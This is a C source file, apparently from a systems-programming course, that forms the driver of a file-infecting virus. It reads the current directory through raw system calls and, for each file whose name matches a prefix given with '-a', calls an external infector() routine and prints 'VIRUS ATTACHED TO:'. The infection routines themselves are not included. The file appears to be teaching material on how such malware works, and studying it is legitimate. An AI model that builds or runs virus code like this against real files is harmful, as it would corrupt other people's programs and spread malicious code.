#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDONLY 0
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define Sys_getDent 141
#define O_APPEND 1024

/* Declare external functions*/
extern void infection();
extern int system_call();
extern void infector(char*);

/* Define directory entry struct*/
typedef struct ent {
    int inode;
    int offset;
    short len;
    char buf[];
} ent;

/* Main function*/
int main (int argc , char* argv[], char* envp[])
{
    /* Define array to hold names*/
    char* names[1];
    names[0]="";

    /* Parse command line arguments*/
    int j=1;
    while(j<argc){
        /* Check for flag "-a" followed by filename*/
        if(argv[j][0]=='-' && argv[j][1]=='a'){
            names[0]=argv[j]+2;
        }
        j++;
    }

    /* Define variables for file descriptor, directory length, buffer, and directory entry*/
    int  fileDesc,dirLen,i=0;
    char buffer[8192];
    ent* file;

    /* Open current directory*/
    fileDesc=system_call(SYS_OPEN,".",O_RDONLY,O_APPEND);
    if(fileDesc<0)
        return 0x55;

    /* Read directory entries*/
    dirLen=system_call(Sys_getDent,fileDesc,buffer,8192);
    if(dirLen<0)
        return 0x55;

    /* Loop through directory entries*/
    while(i<dirLen){
        int foundFile=0;
        file=(ent*)(buffer+i);
        int len=strlen(file->buf);

        /* Check if entry is not "." or ".."*/
        if(strcmp(file->buf,".")!=0 && strcmp(file->buf,"..")!=0){
            /* Loop through characters in filename*/
            while(len>1 && foundFile==0){
                if(strncmp(names[0],file->buf,len)==0){
                    foundFile=1;
                }
                len--;
            }

            /* If filename matches, infect file*/
            if(foundFile==1){
            infector(file->buf);
            system_call(SYS_WRITE,STDOUT,"VIRUS ATTACHED TO: ",18,1);
            }

            /* Write filename to standard output*/
            system_call(SYS_WRITE,STDOUT,file->buf,strlen(file->buf),1);
            system_call(SYS_WRITE,STDOUT,"\n",1,1);
        }

        /* Increment index by length of directory entry*/
        i=i+file->len;
    }

    return 0;
}